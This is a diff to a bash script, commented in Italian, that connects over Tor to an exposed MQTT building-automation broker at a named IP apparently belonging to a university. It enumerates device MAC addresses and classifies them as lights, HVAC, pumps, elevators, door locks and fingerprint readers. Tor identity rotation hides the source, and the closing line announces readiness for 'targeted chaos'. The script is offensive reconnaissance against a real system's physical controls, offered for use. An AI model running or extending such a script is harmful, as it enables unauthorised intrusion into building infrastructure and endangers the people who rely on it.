@@ -1,4 +1,88 @@
 #!/bin/bash
+# 🔥 UIowa Echelon MAC ENUM + AUTO-CLASSIFICAZIONE PULITA w/ TORSOCKS
+# Output: SOLO MAC pulite + tipo → 02xxxxxx → LIGHT | HVAC | etc.
 
-# Esegui solo: torsocks mosquitto_sub -h 128.255.220.144 -p 1883 -t '#' -v | grep -oP '02\w{10}' | sort -u
-torsocks mosquitto_sub -h 128.255.220.144 -p 1883 -t '#' -v 2>/dev/null | grep -oP '02[0-9a-fA-F]{10}' | sort -u | head -20
+HOST="128.255.220.144"
+PORT="1883"
+SID="17qja3r"
+BASE="glp/0/${SID}/fb/dev/lon/"
+
+TOR_PORT="9050"
+
+# 🌐 TORify ogni comando
+torsocks_cmd() {
+    echo -n "🔄 TOR... " 
+    echo 'SIGNAL NEWNYM' | nc 127.0.0.1 9051 >/dev/null 2>&1
+    sleep 0.3
+    torsocks "$@"
+}
+
+echo "🔍 ENUM MAC + CLASSIFICAZIONE TORSOCKS (attendi 45s)..."
+echo "══════════════════════════════════════════"
+
+# STEP 1: Cattura TUTTI i MAC da output enorme (TOR + timeout 25s)
+timeout 25 torsocks_cmd mosquitto_sub -h "$HOST" -p "$PORT" -t '#' -v 2>/dev/null | \
+grep -oP '02[0-9a-fA-F]{10}' | sort -u > raw_macs.txt
+
+mapfile -t ALL_MACS < raw_macs.txt
+
+echo "📡 ${#ALL_MACS[@]} MAC trovate"
+echo "══════════════════════════════════════════"
+
+# STEP 2: CLASSIFICAZIONE per ogni MAC (TOR parallelo)
+> classified_macs.txt
+
+for mac in "${ALL_MACS[@]}"; do
+    # Query rapida DeviceType TOR (1.2s timeout)
+    dev_type=$(timeout 1.2 torsocks_cmd mosquitto_sub -h "$HOST" -p "$PORT" \
+        -t "${BASE}${mac}/if/device/0/nv_DeviceType" -C 1 -v 2>/dev/null | \
+        tail -1 | grep -oE "[A-Z]+$" || echo "GENERIC")
+    
+    # Classifica e stampa PULITO
+    case "$dev_type" in
+        *LIGHT*|*LAMP*|*LED*) 
+            echo "$mac → 💡 LIGHT"
+            echo "$mac → LIGHT" >> classified_macs.txt 
+            ;;
+        *HVAC*|*AIR*|*FAN*|*VAV*) 
+            echo "$mac → 🌡️ HVAC" 
+            echo "$mac → HVAC" >> classified_macs.txt 
+            ;;
+        *HEAT*|*HEATER*) 
+            echo "$mac → 🔥 HEAT" 
+            echo "$mac → HEAT" >> classified_macs.txt 
+            ;;
+        *PUMP*|*WATER*) 
+            echo "$mac → 💧 PUMP" 
+            echo "$mac → PUMP" >> classified_macs.txt 
+            ;;
+        *ELEVATOR*|*LIFT*) 
+            echo "$mac → 🛗 ELEVATOR" 
+            echo "$mac → ELEVATOR" >> classified_macs.txt 
+            ;;
+        *DOOR*|*LOCK*) 
+            echo "$mac → 🔒 DOOR" 
+            echo "$mac → DOOR" >> classified_macs.txt 
+            ;;
+        *FPR*|*FINGER*) 
+            echo "$mac → 👆 FPR" 
+            echo "$mac → FPR" >> classified_macs.txt 
+            ;;
+        *) 
+            echo "$mac → ⚙️ GENERIC" 
+            echo "$mac → GENERIC" >> classified_macs.txt 
+            ;;
+    esac
+done
+
+echo "══════════════════════════════════════════"
+echo "📊 RIASSUNTO TOR:"
+grep -c "→ LIGHT" classified_macs.txt 2>/dev/null && echo "💡 LIGHT: $(grep -c '→ LIGHT' classified_macs.txt)"
+grep -c "→ HVAC" classified_macs.txt 2>/dev/null && echo "🌡️ HVAC: $(grep -c '→ HVAC' classified_macs.txt)"
+grep -c "→ PUMP" classified_macs.txt 2>/dev/null && echo "💧 PUMP: $(grep -c '→ PUMP' classified_macs.txt)"
+grep -c "→ ELEVATOR" classified_macs.txt 2>/dev/null && echo "🛗 ELEVATOR: $(grep -c '→ ELEVATOR' classified_macs.txt)"
+grep -c "→ DOOR" classified_macs.txt 2>/dev/null && echo "🔒 DOOR: $(grep -c '→ DOOR' classified_macs.txt)"
+echo "⚙️ GENERIC: $(grep -c '→ GENERIC' classified_macs.txt)"
+echo "══════════════════════════════════════════"
+echo "💾 Salvato: classified_macs.txt | raw_macs.txt"
+echo "🎯 Pronto per caos TORSOCKS mirato!"
